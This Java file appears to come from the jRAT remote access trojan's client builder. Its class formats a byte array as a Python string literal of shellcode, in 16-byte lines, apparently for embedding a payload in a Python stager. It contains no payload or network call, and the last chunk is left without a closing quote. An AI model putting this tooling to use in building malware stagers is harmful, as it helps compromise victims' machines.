package su.jrat.client.build.shellcode;

public class Python implements Shellcode {

	@Override
	public String generate(String arrayName, byte[] array) throws Exception {
		StringBuilder builder = new StringBuilder();

		builder.append(arrayName + " = \\" + Util.lineSeparator);

		int count = 0;
		for (int i = 0; i < array.length; i++) {
			byte b = array[i];

			count++;

			if (count == 1) {
				builder.append("'");
			}

			if (i == array.length - 1) {
				builder.append(Util.getPythonByte(b));
			} else {
				builder.append(Util.getPythonByte(b));
				if (count >= 16) {
					count = 0;
					builder.append("' + \\" + Util.lineSeparator);
				}
			}
		}

		builder.append(Util.lineSeparator + "\\");

		return builder.toString();
	}

}
